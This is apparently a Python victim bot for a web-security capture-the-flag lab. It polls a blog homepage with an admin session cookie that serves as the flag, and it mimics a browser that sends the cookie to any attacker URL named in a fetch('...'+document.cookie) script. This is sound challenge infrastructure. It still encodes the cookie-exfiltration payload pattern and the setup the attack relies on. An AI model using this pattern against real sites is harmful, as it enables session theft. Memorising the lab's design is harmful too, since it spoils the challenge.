"""zerocl victim: scripted admin poll.

Models the lab's "Carlos": an automated administrator with the flagged
session, polling the blog homepage on one persistent HTTP/1.1 keep-alive
connection. A fresh connection per fetch would defeat the attack
nondeterministically, so the session is deliberately persistent.

Every 5 seconds (fixed cadence, monotonic sleep, zero jitter):
  1. GET / with `Cookie: <COOKIE>` (COOKIE is exported by the entrypoint;
     the flag IS this admin session token),
  2. read the response headers+body on the same connection,
  3. simulate page rendering: any inline `<script>` block whose text
     references an exfil listener is "executed" by fetching that URL
     directly (browser -> C2 socket, NOT through the front end), with
     document.cookie interpolated by the renderer.

The exfil HTTP request therefore lands on the attacker's listener wherever
the page says it should, exactly like a real drive-by.
"""

import http.client
import os
import re
import sys
import time
from urllib.parse import urlsplit

COOKIE = os.environ.get("COOKIE", "session=unset")
COOKIE_NAME, _, COOKIE_VALUE = COOKIE.partition("=")
EXFIL_TIMEOUT = 5


def render_and_exec(body: str) -> str | None:
    """Return document.cookie when the page carries an exfil script."""
    for script in re.findall(r"<script>(.*?)</script>", body, flags=re.S):
        match = re.search(r"fetch\('([^']+)'\+document\.cookie\)", script)
        if match:
            break
    else:
        return None
    return f"{match.group(1)}session={COOKIE_VALUE}"


def exfil_fetch(target_url: str) -> None:
    parts = urlsplit(target_url)
    host = parts.hostname or "attacker"
    port = parts.port or 80
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    try:
        conn = http.client.HTTPConnection(host, port, timeout=EXFIL_TIMEOUT)
        conn.request("GET", path)
        conn.getresponse().read()
        conn.close()
        print(f"[victim] exfiltrated to {target_url}", flush=True)
    except OSError as exc:
        print(f"[victim] exfil failed ({exc})", file=sys.stderr, flush=True)


def poll_once(conn: http.client.HTTPConnection) -> None:
    conn.request(
        "GET",
        "/",
        headers={
            "Host": "frontend",
            "Connection": "keep-alive",
            "Cookie": COOKIE,
        },
    )
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", "replace")
    print(f"[{time.strftime('%H:%M:%S')}] GET / -> {resp.status} ({len(body)} bytes)", flush=True)
    target = render_and_exec(body)
    if target:
        exfil_fetch(target)


def main() -> int:
    global COOKIE
    if not COOKIE or COOKIE_VALUE == "unset":
        print("[victim] no session cookie exported; aborting", flush=True)
        return 1
    conn = http.client.HTTPConnection("frontend", 80, timeout=5)
    while True:
        deadline = time.monotonic() + 5.0
        try:
            poll_once(conn)
        except (OSError, http.client.HTTPException) as exc:
            print(f"[victim] reconnecting: {exc}", flush=True)
            try:
                conn.close()
            except OSError:
                pass
            time.sleep(1.0)
            conn = http.client.HTTPConnection("frontend", 80, timeout=5)
            continue
        remaining = deadline - time.monotonic()
        if remaining > 0:
            time.sleep(remaining)
    return 0


if __name__ == "__main__":
    sys.exit(main())
